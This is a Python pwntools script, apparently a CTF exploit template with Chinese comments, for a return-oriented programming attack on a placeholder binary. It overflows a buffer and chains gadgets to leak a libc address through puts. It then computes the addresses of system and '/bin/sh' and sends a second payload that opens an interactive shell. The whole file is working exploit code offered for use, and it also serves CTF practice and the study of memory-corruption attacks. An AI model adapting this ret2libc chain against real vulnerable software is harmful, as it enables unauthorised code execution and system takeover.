#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROP Chain Template - Return Oriented Programming
Author: CTF Player
Date: 2025-01-XX
Target: target_binary
"""

from pwn import *

# 设置目标程序
binary = "./target"
elf = ELF(binary)
libc = ELF("./libc.so.6")  # 如果有libc

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("127.0.0.1", 9999)
    else:
        p = process(binary)

    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')

    # 查找gadgets
    pop_rdi = 0x401234  # pop rdi; ret
    pop_rsi = 0x401235  # pop rsi; ret
    pop_rdx = 0x401236  # pop rdx; ret
    
    # 构造ROP链
    rop = ROP(elf)
    rop.call('puts', [elf.got['puts']])
    rop.call(elf.symbols['main'])
    
    # 第一次payload - 泄露libc地址
    payload1 = b"A" * 72
    payload1 += rop.chain()

    p.sendline(payload1)

    # 接收泄露的地址
    puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

    log.info(f"Leaked puts: {hex(puts_addr)}")
    log.info(f"Libc base: {hex(libc_base)}")
    log.info(f"System: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(bin_sh_addr)}")

    # 第二次payload - 获取shell
    payload2 = b"A" * 72
    payload2 += p64(pop_rdi)
    payload2 += p64(bin_sh_addr)
    payload2 += p64(system_addr)
    
    p.sendline(payload2)
    
    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
